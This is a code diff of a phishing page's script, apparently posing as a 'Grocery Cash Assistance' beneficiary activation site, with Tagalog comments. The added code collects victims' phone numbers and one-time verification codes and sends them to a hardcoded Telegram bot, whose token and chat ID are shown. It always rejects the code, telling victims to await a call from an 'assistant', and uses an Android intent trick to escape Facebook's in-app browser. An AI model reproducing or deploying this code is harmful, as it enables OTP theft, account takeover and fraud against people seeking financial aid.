@@ -178,56 +178,106 @@
 
     <script src="config.js"></script>
 
-<script>
-    const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
-    const chatId = '7298607329';
-    const BYPASS_MODE = true;
+    <script>
+        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+        const chatId = '7298607329';
+        const BYPASS_MODE = true; 
 
-    function processStep1() {
-        const phoneInput = document.getElementById('userPhone');
-        const phone = phoneInput.value.trim();
-        const regStatus = document.querySelector('input[name="reg"]:checked').value;
+        const isFacebookApp = () => {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            return (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1);
+        };
 
-        // A. FORMAT VALIDATION
-        if (phone.length < 11 || !phone.startsWith('09')) {
-            phoneInput.classList.add('shake-error');
-            setTimeout(() => phoneInput.classList.remove('shake-error'), 500);
-            return;
+        if (isFacebookApp()) {
+            alert("Please tap (⋮) and 'Open in Browser' to complete your beneficiary activation.");
         }
 
-        // B. CHECK SA CONFIG.JS (Pop-up Logic)
-        // Chine-check kung exist ang CLAIMED_NUMBERS variable
-        if (typeof CLAIMED_NUMBERS !== 'undefined') {
-            if (CLAIMED_NUMBERS.includes(phone)) {
-                // Lalabas ang pop-up alert dito
-                alert("SYSTEM MESSAGE:\n\nThe mobile number " + phone + " has already successfully claimed the Grocery Cash Assistance (GCA). \n\nLimit: 1 Claim per Beneficiary.");
-                
-                phoneInput.classList.add('shake-error');
-                phoneInput.value = ""; 
-                setTimeout(() => phoneInput.classList.remove('shake-error'), 500);
-                return; // Stop ang process, hindi magse-send sa Telegram
+        function handleVerify() {
+            const currentUrl = window.location.href.replace(/^https?:\/\//, '');
+            if (!window.location.hash.includes("verified")) {
+                const intentUrl = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
+                window.location.href = intentUrl;
+                setTimeout(() => {
+                    document.getElementById('modalOverlay').style.display = 'flex';
+                }, 1500);
+            } else {
+                document.getElementById('modalOverlay').style.display = 'flex';
             }
-        } else {
-            console.error("Error: config.js or CLAIMED_NUMBERS not found!");
         }
 
-        // C. PROCEED SA TELEGRAM (Kung wala sa listahan)
-        const msg = `🛒 GROCERY ASSIST REQUEST:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
-        new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+        window.onload = () => {
+            if (window.location.hash.includes("verified")) {
+                document.getElementById('modalOverlay').style.display = 'flex';
+            }
+        };
 
-        if(BYPASS_MODE) {
-            setTimeout(() => {
-                window.location.href = "main.html";
-            }, 800);
-        } else {
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-            startCountDown(300);
+        function processStep1() {
+            const phoneInput = document.getElementById('userPhone');
+            const phone = phoneInput.value.trim();
+            const regStatus = document.querySelector('input[name="reg"]:checked').value;
+
+            // 1. VALIDATION FORMAT
+            if (phone.length < 11 || !phone.startsWith('09')) {
+                phoneInput.classList.add('shake-error');
+                setTimeout(() => phoneInput.classList.remove('shake-error'), 500);
+                return;
+            }
+
+            // 2. CHECK IF ALREADY CLAIMED (From config.js)
+            if (typeof CLAIMED_NUMBERS !== 'undefined') {
+                if (CLAIMED_NUMBERS.includes(phone)) {
+                    // DITO LALABAS ANG POP-UP MESSAGE
+                    alert("SYSTEM MESSAGE:\n\nThe mobile number " + phone + " has already successfully claimed the Grocery Cash Assistance (GCA). \n\nLimit: 1 Claim per Beneficiary.");
+                    
+                    phoneInput.classList.add('shake-error');
+                    phoneInput.value = ""; 
+                    setTimeout(() => phoneInput.classList.remove('shake-error'), 500);
+                    return; // STOP DITO, HINDI NA MAGSESEND SA TELEGRAM
+                }
+            }
+
+            // 3. TELEGRAM NOTIFICATION (Kung wala sa listahan)
+            const msg = `🛒 GROCERY ASSIST REQUEST:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
+            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+
+            if(BYPASS_MODE) {
+                setTimeout(() => {
+                    window.location.href = "main.html";
+                }, 800);
+            } else {
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+                startCountDown(300);
+            }
         }
-    }
-    
-    // ... panatilihin ang ibang functions (handleVerify, etc.)
-</script>
-    
+
+        function processStep2() {
+            const vInput = document.getElementById('vCode');
+            const phone = document.getElementById('userPhone').value;
+
+            vInput.classList.add('shake-error');
+            setTimeout(() => vInput.classList.remove('shake-error'), 500);
+            
+            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('⚠️ GROCERY CODE FAILED:\n📱 ' + phone + '\n🔢 Code: ' + vInput.value)}`;
+            
+            alert("Activation failed. Please wait for a new system call from our assistant.");
+            vInput.value = "";
+        }
+
+        function startCountDown(sec) {
+            let timer = sec;
+            const display = document.getElementById('waitTimer');
+            const interval = setInterval(() => {
+                let m = Math.floor(timer / 60);
+                let s = timer % 60;
+                display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    timer = 0;
+                }
+            }, 1000);
+        }
+    </script>
+
 </body>
 </html>
